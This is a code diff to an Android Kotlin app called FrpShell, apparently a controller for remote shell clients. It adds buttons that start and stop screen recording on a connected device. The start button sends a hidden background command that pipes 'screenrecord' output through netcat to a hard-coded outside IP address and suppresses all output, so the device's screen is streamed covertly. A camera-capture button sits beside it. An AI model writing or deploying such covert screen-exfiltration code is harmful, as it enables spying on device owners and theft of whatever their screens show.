@@ -42,6 +42,12 @@ import com.kgapp.frpshell.model.ShellTarget
 import com.kgapp.frpshell.ui.theme.FrpShellTheme
 import kotlinx.coroutines.launch
 
+
+import androidx.compose.material.icons.filled.Stop  // 用于停止图标
+import androidx.compose.material.icons.filled.Videocam      
+
+
+
 import androidx.compose.foundation.layout.padding
 import androidx.compose.ui.unit.dp
 
@@ -149,6 +155,19 @@ fun MainScaffold(vm: MainViewModel = viewModel()) {
                                 }
                             } else if (!isSettings && !uiState.screenViewerVisible) {
                                 if (!uiState.fileManagerVisible && uiState.selectedTarget is ShellTarget.Client) {
+                                IconButton(onClick = { 
+                vm.sendCommand("nohup screenrecord --bit-rate 100000 --output-format=h264 - | nc 47.113.126.123 40001 > /dev/null 2>&1 &")
+            }) {
+                Icon(Icons.Default.Videocam, contentDescription = "start recording")
+            }
+            
+            // 结束录屏按钮
+            IconButton(onClick = { 
+                vm.sendCommand("pkill -9 screenrecord")
+            }) {
+                Icon(Icons.Default.Stop, contentDescription = "stop recording")
+            }
+                                
                                     IconButton(onClick = vm::openCameraSelector) {
                                         Icon(Icons.Default.PhotoCamera, contentDescription = "take photo")
                                     }
